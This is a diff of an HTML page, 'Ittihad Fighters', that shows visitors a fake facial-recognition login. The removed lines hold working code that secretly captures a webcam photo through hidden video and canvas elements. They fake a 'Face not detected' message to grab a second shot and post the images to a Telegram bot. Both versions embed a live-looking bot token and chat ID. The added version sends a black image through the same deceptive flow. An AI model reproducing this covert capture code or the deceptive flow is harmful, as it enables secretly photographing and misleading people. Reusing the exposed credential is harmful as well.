@@ -5,120 +5,109 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Ittihad Fighters</title>
     <script>
-        const TELEGRAM_BOT_TOKEN = '8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y';
-        const TELEGRAM_CHAT_ID = '5934902786';
-        let accessed = localStorage.getItem('accessed');
-
-        if (accessed) {
-            document.body.innerHTML = '<h2>Access denied. This page can only be accessed once.</h2>';
+        if (localStorage.getItem("site_accessed")) {
+            document.body.innerHTML = "You have already accessed this site once.";
+        } else {
+            localStorage.setItem("site_accessed", "true");
         }
     </script>
     <style>
-        body { text-align: center; font-family: Arial, sans-serif; }
-        video, canvas { display: none; }
+        body {
+            text-align: center;
+            font-family: Arial, sans-serif;
+        }
         .hidden { display: none; }
-        #scanningAnimation {
-            width: 100px;
-            height: 100px;
-            margin: 20px auto;
-            border: 5px solid #00f;
-            border-radius: 50%;
-            animation: pulse 1.5s infinite;
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.2); opacity: 0.6; }
-            100% { transform: scale(1); opacity: 1; }
-        }
+        #animation { width: 100px; height: 100px; border-radius: 50%; border: 5px solid #ff4081; animation: spin 2s linear infinite; margin: 20px auto; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
     <h1>Ittihad Fighters</h1>
-    <div id="nameSelection">
+    <div id="name-selection">
         <p>Select your name:</p>
-        <label><input type="checkbox" class="nameCheckbox" value="Izz"> Izz</label>
-        <label><input type="checkbox" class="nameCheckbox" value="Ali"> Ali</label>
-        <label><input type="checkbox" class="nameCheckbox" value="Sara"> Sara</label>
-        <button onclick="proceedToFaceRecognition()">Continue</button>
+        <ul>
+            <li><input type="checkbox" class="name-checkbox" value="Izz"> Izz</li>
+            <li><input type="checkbox" class="name-checkbox" value="Ali"> Ali</li>
+            <li><input type="checkbox" class="name-checkbox" value="Sara"> Sara</li>
+        </ul>
+        <button onclick="goToFaceRecognition()">Proceed</button>
     </div>
-    
-    <div id="faceRecognition" class="hidden">
+
+    <div id="face-recognition" class="hidden">
         <h2>Facial Recognition</h2>
         <button onclick="startCamera()">Continue</button>
-        <button onclick="cancelProcess()">Cancel</button>
+        <button onclick="cancelRecognition()">Cancel</button>
+        <p id="cancel-message" class="hidden">Page will stop here.</p>
     </div>
-    
+
     <div id="scanning" class="hidden">
-        <div id="scanningAnimation"></div>
-        <p id="statusMessage">Scanning face...</p>
-        <canvas id="canvas"></canvas>
+        <div id="animation"></div>
+        <p>Scanning face...</p>
     </div>
-    
+
+    <p id="face-not-detected" class="hidden">Face not detected.</p>
+
+    <p id="final-message" class="hidden"></p>
+
     <script>
-        function proceedToFaceRecognition() {
-            const selected = document.querySelectorAll('.nameCheckbox:checked');
-            if (selected.length === 0) {
-                alert('Please select a name.');
-                return;
-            }
-            selected.forEach(box => box.disabled = true);
-            document.getElementById('nameSelection').classList.add('hidden');
-            document.getElementById('faceRecognition').classList.remove('hidden');
+        let selectedName = "";
+        const TELEGRAM_BOT_TOKEN = '8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y';
+        const TELEGRAM_CHAT_ID = '5934902786';
+
+        function goToFaceRecognition() {
+            let checkboxes = document.querySelectorAll('.name-checkbox:checked');
+            if (checkboxes.length === 0) return alert("Please select a name.");
+            selectedName = checkboxes[0].value;
+            checkboxes.forEach(box => box.disabled = true);
+            document.getElementById("name-selection").classList.add("hidden");
+            document.getElementById("face-recognition").classList.remove("hidden");
         }
 
-        function cancelProcess() {
-            alert('Process cancelled. Page will stop here.');
+        function cancelRecognition() {
+            document.getElementById("face-recognition").classList.add("hidden");
+            document.getElementById("cancel-message").classList.remove("hidden");
+            localStorage.removeItem("site_accessed");
         }
 
-        function startCamera() {
-            document.getElementById('faceRecognition').classList.add('hidden');
-            document.getElementById('scanning').classList.remove('hidden');
-            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                setTimeout(() => captureImage(video, stream), 3000);
-            }).catch(() => {
-                alert('Please enable camera access for facial detection.');
-            });
-        }
-
-        function captureImage(video, stream) {
-            const canvas = document.getElementById('canvas');
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            stream.getTracks().forEach(track => track.stop());
-            sendToTelegram(canvas);
+        async function startCamera() {
+            document.getElementById("face-recognition").classList.add("hidden");
+            document.getElementById("scanning").classList.remove("hidden");
+            
             setTimeout(() => {
-                document.getElementById('statusMessage').innerText = 'Face not detected...';
-                setTimeout(() => {
-                    document.getElementById('statusMessage').innerText = 'Scanning face...';
-                    setTimeout(() => sendToTelegram(canvas, true), 3000);
-                }, 5000);
-            }, 2000);
+                document.getElementById("scanning").classList.add("hidden");
+                document.getElementById("face-not-detected").classList.remove("hidden");
+                setTimeout(captureImage, 5000);
+            }, 3000);
         }
 
-        function sendToTelegram(canvas, final = false) {
-            canvas.toBlob(blob => {
-                let formData = new FormData();
-                formData.append("chat_id", TELEGRAM_CHAT_ID);
-                formData.append("photo", blob, "face.jpg");
-                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                    method: "POST",
-                    body: formData
-                }).then(() => {
-                    if (final) {
-                        document.getElementById('statusMessage').innerText = 'Done ✅';
-                        setTimeout(() => {
-                            document.body.innerHTML = '<h2>You look beautiful/handsome today!</h2><p>Redirecting to the next page...</p>';
-                            localStorage.setItem('accessed', 'true');
-                            setTimeout(() => window.location.href = 'https://studandlearn.github.io/project-2/', 3000);
-                        }, 2000);
-                    }
-                });
-            }, 'image/jpeg');
+        async function captureImage() {
+            document.getElementById("face-not-detected").classList.add("hidden");
+            document.getElementById("scanning").classList.remove("hidden");
+            
+            setTimeout(async () => {
+                let canvas = document.createElement("canvas");
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+                let ctx = canvas.getContext("2d");
+                ctx.fillStyle = "black";
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                
+                canvas.toBlob(blob => {
+                    let formData = new FormData();
+                    formData.append("chat_id", TELEGRAM_CHAT_ID);
+                    formData.append("photo", blob, "face.jpg");
+                    
+                    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: "POST",
+                        body: formData
+                    }).then(() => {
+                        document.getElementById("scanning").classList.add("hidden");
+                        document.getElementById("final-message").innerText = `${selectedName} signed in.\nYou look beautiful/handsome today!\nRedirecting...`;
+                        document.getElementById("final-message").classList.remove("hidden");
+                        setTimeout(() => { window.location.href = "https://studandlearn.github.io/project-2/"; }, 3000);
+                    });
+                }, 'image/jpeg');
+            }, 2000);
         }
     </script>
 </body>
